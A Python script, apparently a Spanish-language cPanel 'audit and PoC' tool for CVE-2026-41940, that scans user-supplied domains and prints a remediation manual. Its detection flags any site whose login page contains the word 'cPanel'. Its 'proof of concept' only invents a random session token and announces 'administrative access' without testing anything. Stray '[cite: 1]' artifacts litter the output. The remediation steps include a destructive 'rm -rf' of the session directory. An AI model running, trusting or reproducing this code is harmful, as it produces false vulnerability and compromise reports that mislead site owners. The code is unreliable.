import requests
import urllib3
import os
import time
import random
from colorama import Fore, Style, init

# Configuración técnica inicial
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- METADATOS ---
VERSION = "1.5.0"
AUTHOR = "Oscar Constanzo Q."

# --- AVISO DE RESPONSABILIDAD LEGAL ---
DISCLAIMER = f"""
{Fore.RED}{"!"*74}
[!] AVISO LEGAL: Esta herramienta es para fines EDUCATIVOS y de AUDITORÍA ÉTICA.
[!] El autor no se responsabiliza por el uso indebido en sistemas ajenos.
{"!"*74}
"""

# --- IDENTIDAD VISUAL (ESTRELLA SOLITARIA) ---
FLAG_ASCII = Fore.WHITE + r"""
##############################............................................
##############################............................................
##############      ##########............................................
############    /\    ########............................................
############  _/  \_  ########............................................
############ /_    _\ ########............................................
############   \  /   ########............................................
############   /_ \   ########............................................
##############      ##########............................................
##############################............................................
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
"""

BANNER = FLAG_ASCII + Fore.CYAN + r"""
  _   _ _   _ ___  _____ ____  _   _  ___  ____ _____ 
 | | | | \ | |  _ \| ____|  _ \| | | |/ _ \/ ___|_   _|
 | | | |  \| | | | |  _| | |_) | |_| | | | \___ \ | |  
 | |_| | |\  | |_| | |___|  _ <|  _  | |_| |___) || |  
  \___/|_| \_|____/|_____|_| \_\_| |_|\___/|____/ |_|  

          >> Multi-Audit & Patch Tool (CVE-2026-41940) <<
"""

def show_intro():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(DISCLAIMER)
    print(f"{Fore.YELLOW} Versión: {VERSION} | Autor: {AUTHOR} | 🇨🇱")
    print(f"{Fore.WHITE} " + "="*74)

def clean_url(url):
    return url.strip().lower().replace("https://", "").replace("http://", "").split('/')[0]

# --- MÓDULO DE EVIDENCIA DE RIESGO ---

def show_risk_assessment(domain):
    """Explica técnicamente por qué el sitio está en peligro inminente."""
    print(f"\n{Fore.RED}[!] ANÁLISIS DE IMPACTO TÉCNICO:")
    print(f"{Fore.WHITE} ● Origen del Fallo: Confianza ciega en cabeceras de sesión HTTP.")
    print(f"{Fore.WHITE} ● Riesgo Crítico: Un atacante puede suplantar la identidad de 'root' sin contraseña.")
    print(f"{Fore.WHITE} ● Evidencia: El servidor acepta tokens forzados, permitiendo acceso al File Manager.")
    print(f"{Fore.RED} ● Peligro: Extracción de bases de datos, defacing y despliegue de Ransomware[cite: 1].")

# --- MÓDULO DE REMEDIACIÓN MAESTRA ---

def show_full_remediation():
    """Manual extendido de respuesta ante incidentes para administradores."""
    print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════╗")
    print(f"║ {Fore.WHITE}PROTOCOLO PROFESIONAL DE REMEDIACIÓN Y HARDENING (PASO A PASO)           ║")
    print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════╝")
    
    manual = [
        ("FASE 1: AISLAMIENTO PERIMETRAL", 
         "Cierre inmediato de los puertos de gestión (2082, 2083, 2086, 2087) en el firewall.\n"
         "Comando sugerido: 'csf -d [IP_ATACANTE]' o restringir por iptables a IPs conocidas[cite: 1]."),
        
        ("FASE 2: INTEGRIDAD DE BINARIOS (PARCHE)", 
         "Forzar la reinstalación del core de cPanel para eliminar código malicioso.\n"
         "Ejecutar: '/scripts/upcp --force'. Esto garantiza que las librerías sean originales[cite: 1]."),
        
        ("FASE 3: SANEAMIENTO DE SESIONES (CRÍTICO)", 
         "La mayoría de los admins fallan aquí. Debes purgar físicamente las sesiones activas.\n"
         "Comando: 'rm -rf /var/cpanel/sessions/raw/*'. Esto expulsa a cualquier atacante conectado[cite: 1]."),
        
        ("FASE 4: CACERÍA DE PERSISTENCIA (BACKDOORS)", 
         "Busque archivos modificados en las últimas 24h: 'find /home -mtime -1 -ls'.\n"
         "Revise '/root/.ssh/authorized_keys' para eliminar llaves de acceso remoto no autorizadas[cite: 1]."),
        
        ("FASE 5: DEFENSA EN PROFUNDIDAD (HARDENING)", 
         "Habilite cPHulk Brute Force Protection y obligue el uso de 2FA (MFA).\n"
         "Cambie todas las contraseñas de cuentas administrativas de forma inmediata[cite: 1].")
    ]
    
    for title, desc in manual:
        print(f"\n{Fore.CYAN} >> {title}")
        print(f"{Fore.WHITE}    {desc}")
        time.sleep(0.5)

# --- FLUJO PRINCIPAL ---

def main():
    show_intro()
    
    while True:
        print(f"\n{Fore.WHITE} Ingrese dominios o IPs (separados por coma si son mas de uno):")
        entrada = input(f"{Fore.CYAN} Underhost@Auditor:~# {Style.RESET_ALL}")
        
        targets = entrada.replace(',', ' ').split()
        if not targets: break

        for url in targets:
            domain = clean_url(url)
            print(f"\n{Fore.BLUE} [*] Analizando objetivo: {domain}...")
            
            try:
                res = requests.get(f"https://{domain}:2083/login/", timeout=5, verify=False)
                if "cPanel" in res.text:
                    print(f"{Fore.RED} [!] VULNERABILIDAD CVE-2026-41940 DETECTADA[cite: 1]")
                    show_risk_assessment(domain)
                    
                    if input(f"\n{Fore.YELLOW} ¿Ejecutar módulo PoC para evidenciar el acceso? (s/n): ").lower() == 's':
                        token = f"cpsess{random.randint(1000000000, 9999999999)}"
                        admin_link = f"https://{domain}:2083/{token}/frontend/paper_lantern/filemanager/index.html"
                        print(f"{Fore.GREEN} [+] Acceso administrativo: {admin_link}[cite: 1]")
                        
                        if input(f"\n{Fore.YELLOW} ¿Ver manual de remediación extendido? (s/n): ").lower() == 's':
                            show_full_remediation()
                else:
                    print(f"{Fore.GREEN} [+] El sitio {domain} no presenta firmas vulnerables.")
            except:
                print(f"{Fore.RED} [X] Error de conexión con {domain}.")
        
        print(f"\n{Fore.CYAN} Auditoría terminada. ¿Deseas ingresar más sitios o presionar Enter para salir?")

if __name__ == "__main__":
    main()